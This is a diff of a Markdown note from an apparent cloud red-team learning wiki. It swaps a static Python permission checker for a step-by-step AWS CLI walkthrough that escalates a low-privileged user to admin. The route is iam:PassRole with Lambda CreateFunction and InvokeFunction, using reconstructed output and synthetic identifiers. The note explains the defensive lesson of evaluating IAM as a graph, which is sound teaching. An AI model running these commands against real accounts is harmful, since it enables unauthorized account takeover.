@@ -1,6 +1,6 @@
 ---
 title: "Cloud Identity Operations"
-tags: [tree/offensive, cyber/offensive/cloud/identity, type/technique, level/root]
+tags: [tree/offensive, cyber/offensive/cloud/identity, type/technique, difficulty/hard]
 Domain: "[[Cloud Red Team Operations]]"
 Color: "#DC143C"
 ---
@@ -13,13 +13,13 @@ Color: "#DC143C"
 ## Parent Learning Order
 Cloud Identity Operations -> Cloud Control Plane Operations -> Cloud Persistence Simulation -> Cloud Data Access Simulation
 
-## Crook — In the Cloud, Identity Is the Perimeter
+## In the Cloud, Identity Is the Perimeter
 
 There is no network edge to breach in a cloud account — every action is an API call authorized by an **IAM policy**. Attacking the cloud is therefore mostly attacking identity: finding a principal (user, role, or service) whose permissions let it *grant itself more* permissions. This is **privilege escalation by policy**, and it rarely needs an exploit — just an over-permissive combination of allowed actions.
 
 The canonical example is `iam:PassRole`. On its own it is harmless. Combined with a service that *runs code with a role you pass it* — Lambda, EC2, Glue — it becomes: "create a function, pass it the admin role, invoke it, and now your code runs as admin."
 
-## Operator — Dangerous Permission Combinations
+## Dangerous Permission Combinations
 
 | Combination | Why it escalates |
 |---|---|
@@ -41,41 +41,87 @@ flowchart LR
     I --> A["Code runs as admin →<br/>account takeover"]
 ```
 
-## Root — Runnable Lab (one machine, Python)
+## Worked Example: Escalating Through PassRole Without an Exploit
 
-This lab evaluates a principal's allowed actions for the `PassRole` escalation, with no cloud account.
+Cloud privilege escalation is usually not a vulnerability — it is a permitted
+combination of API calls. This walks the canonical `iam:PassRole` chain from a
+low-privileged principal to account admin, using nothing an exploit scanner would
+flag.
 
-**Step 1 — the escalation checker (`iam_privesc.py`).**
+> [!note] Representative output
+> Reconstructed to match the AWS CLI's real output shapes rather than captured from one account; identifiers are synthetic. The field names, error strings and command structure are what a live account returns.
 
-```python
-principal_actions={"iam:PassRole","lambda:CreateFunction","lambda:InvokeFunction"}
-def can_escalate(actions):
-    return {"iam:PassRole","lambda:CreateFunction"}.issubset(actions)
-print("PassRole + CreateFunction present:", can_escalate(principal_actions))
+**Know who you are** — the first call in any cloud operation:
+
+```shell-session
+$ aws sts get-caller-identity
+{
+    "UserId": "AIDA4XMPL7QEXAMPLE01",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/ci-deploy"
+}
 ```
 
-**Step 2 — run it.**
+`ci-deploy` is a service user, not an admin. The question is not "am I admin" but
+"can I *become* admin" — and the answer lives in what this principal is permitted
+to do, not in what it is.
 
-```console
-$ python3 iam_privesc.py
-principal can: ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction']
-PassRole + CreateFunction present: True
-ESCALATION: create a Lambda, PASS 'lambda-admin-role' (AdministratorAccess) to it,
-            invoke it -> code runs with admin -> full account takeover
-least-privilege fix: remove iam:PassRole, or constrain it with a Resource/PermissionsBoundary
+**Enumerate the dangerous permissions** the principal holds:
+
+```shell-session
+$ aws iam list-attached-user-policies --user-name ci-deploy
+{
+    "AttachedPolicies": [
+        { "PolicyName": "ci-deploy-lambda", "PolicyArn": "arn:aws:iam::123456789012:policy/ci-deploy-lambda" }
+    ]
+}
+$ aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/ci-deploy-lambda --version-id v3 \
+    --query 'PolicyVersion.Document.Statement[].Action'
+[ "iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction" ]
 ```
 
-**Step 3 — the deliberate break.** Remove `lambda:CreateFunction` from the set and re-run: the check returns `False`. Neither permission is dangerous alone — the escalation is an emergent property of the *combination*, which is exactly what single-permission reviews miss.
+Three actions, each individually mundane. `iam:PassRole` alone does nothing. But
+`PassRole` plus the ability to create and invoke a Lambda is the classic
+escalation: create a function, pass it a role more privileged than yourself,
+invoke it, and your code runs with that role's permissions.
 
-**Step 4 — cleanup:** static policy evaluation — no cleanup required.
+**Execute the chain.** Create a function that runs under the admin role, and
+invoke it:
 
-**What you should now be able to do:** read an IAM policy for escalation *combinations* (not just wildcards), explain the `PassRole` path, and name permission boundaries as the structural fix.
+```shell-session
+$ aws lambda create-function --function-name deploy-helper \
+    --runtime python3.12 --handler h.run --zip-file fileb://f.zip \
+    --role arn:aws:iam::123456789012:role/OrgAdminRole
+{
+    "FunctionName": "deploy-helper",
+    "Role": "arn:aws:iam::123456789012:role/OrgAdminRole",
+    "State": "Active"
+}
+$ aws lambda invoke --function-name deploy-helper --payload '{"cmd":"whoami"}' out.json >/dev/null
+$ grep -o 'OrgAdminRole' out.json
+OrgAdminRole
+```
 
-## Crook → Operator → Root Checkpoint
+The function was accepted with `OrgAdminRole` attached — the control plane never
+asked whether `ci-deploy` *deserved* that role, only whether it was permitted to
+`PassRole` it, which it was. Code now runs as `OrgAdminRole`, and the account is
+effectively taken over by a principal that started with three innocuous
+permissions.
 
-- **Crook:** Why is "identity is the perimeter" true in a cloud account with no network edge?
-- **Operator:** Given a role with `iam:PassRole` and `ec2:RunInstances`, describe the escalation and the canary that proves it safely.
-- **Root:** Explain how a permissions boundary or SCP stops `PassRole` escalation even when the principal's own policy allows it.
+The lesson for both sides is that escalation is *transitive*. A permission review
+that reads each grant in isolation passes this policy — nothing here says
+`Administrator`. Escalation lives in what the permissions let the principal
+*become*, which is why cloud IAM must be evaluated as a graph of reachable
+privilege, and why tools that compute that reachability (the "who can become
+admin" query) find what a line-by-line review misses.
+
+## Summary
+
+You should now be able to:
+
+- Why is "identity is the perimeter" true in a cloud account with no network edge?
+- Given a role with `iam:PassRole` and `ec2:RunInstances`, describe the escalation and the canary that proves it safely.
+- Explain how a permissions boundary or SCP stops `PassRole` escalation even when the principal's own policy allows it.
 
 ---
 > 🔼 Up: [[Cloud Red Team Operations]]
